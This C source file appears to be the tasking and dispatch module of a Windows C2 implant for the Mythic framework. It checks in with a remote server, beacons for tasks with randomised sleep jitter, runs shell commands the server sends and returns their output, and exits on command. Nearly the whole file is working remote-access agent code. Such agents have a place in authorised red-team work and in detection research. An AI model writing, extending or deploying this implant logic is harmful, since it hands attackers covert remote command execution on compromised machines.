#include "Command.h"

BOOL handleGetTasking(PParser getTasking)
{
	SIZE_T uuidLength = 36;
	UINT32 numTasks = getInt32(getTasking);
	if (numTasks)
		_dbg("[TASKING] Got %d tasks !\n", numTasks);

	// Create response package
	PPackage response = newPackage(POST_RESPONSE, TRUE);
	addInt32(response, numTasks);

	for (UINT32 i = 0; i < numTasks; i++)
	{
		// We subtract 1 for the task ID (fetched in next line)
		// We substract 36 for the UUID (fetched in line after that)
		SIZE_T argsSize = getInt32(getTasking) - 1 - 36; 

		BYTE taskCmd = getByte(getTasking);

		PCHAR taskUuid = getString(getTasking, &uuidLength);
		addString(response, taskUuid, FALSE);	// Add UUID to response

		// only the params (& the length in front) will be sent to respective command function
		PBYTE taskBufferWithArgs = getBytes(getTasking, &argsSize);
		PParser taskParser = newParser(taskBufferWithArgs, argsSize);

		if (taskCmd == SHELL_CMD)
		{
			PPackage output = executeShell(taskParser);	
			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
			freePackage(output);
		}
		else if (taskCmd == EXIT_CMD)
		{
			// Send response before exiting
			PParser responseParser = sendPackage(response);

			if (responseParser)
			{
					// Free relevant memory
					LocalFree(taskUuid);
					freeParser(taskParser);
					freeParser(getTasking);
					freeParser(responseParser);
					freeCeosConfig();

					ExitProcess(0);		// nothing after this line will get executed

					return TRUE;
			}

			return FALSE;
		}
		else if (taskCmd == EXIT_THREAD_CMD)
		{
			// Send response before exiting
			PParser responseParser = sendPackage(response);

			if (responseParser)
			{
				// Free relevant memory
				LocalFree(taskUuid);
				freeParser(taskParser);
				freeParser(getTasking);
				freeParser(responseParser);
				freeCeosConfig();

				ExitThread(0);		// nothing after this line will get executed

				return TRUE;
			}

			return FALSE;
		}
		else
		{
			// Normally we never get here
			return FALSE;
		}

		LocalFree(taskUuid);
	}

	PParser responseParser = sendPackage(response);
	freeParser(responseParser);		// TODO: handel POST_RESPONSE van C2->agent effectief af

	return TRUE;
}


BOOL commandDispatch(PParser response)
{
	BYTE typeResponse = getByte(response);
	if (typeResponse == GET_TASKING)
		return handleGetTasking(response);
	else if (typeResponse == POST_RESPONSE)
		return TRUE;	// TODO: handel POST_RESPONSE van C2->agent effectief af


	return TRUE;
}


BOOL parseCheckin(PParser ResponseParser) {
	if (getByte(ResponseParser) != CHECKIN)
	{
		freeParser(ResponseParser);
		return FALSE;
	}

	// Mythic sends a new UUID after the checkin : we need to update it
	SIZE_T sizeUuid = 36;
	PCHAR newUUID = getString(ResponseParser, &sizeUuid);
	setUUID(newUUID);

	_dbg("[TASKING] Got new UUID ! --> %s\n", newUUID);

	freeParser(ResponseParser);

	return TRUE;
}


BOOL routine()
{
	// Asking for new tasks
	PPackage getTask = newPackage(GET_TASKING, TRUE);
	addInt32(getTask, ceosConfig->numTasks);

	PParser ResponseParser = sendPackage(getTask);

	if (!ResponseParser)
		return FALSE;

	commandDispatch(ResponseParser);

	freeParser(ResponseParser);
	
	// Sleep (with jitter)
	if (ceosConfig->jitter < 1) {
		Sleep(ceosConfig->sleeptime_ms);
	}
	else
	{
		UINT32 jitter_perc = get_random_int(ceosConfig->jitter);
		UINT32 jitter_amount = (ceosConfig->sleeptime_ms * jitter_perc)/100;
		if ((rand() % 2) == 1)
		{
			Sleep(ceosConfig->sleeptime_ms + jitter_amount);
		}
		else
		{
			if (ceosConfig->sleeptime_ms > jitter_amount)
			{
				Sleep(ceosConfig->sleeptime_ms - jitter_amount);
			}
			else
			{
				// ensures sleep time is non-negative
				Sleep(ceosConfig->sleeptime_ms);
			}
		}
	}
	
	return TRUE;

}
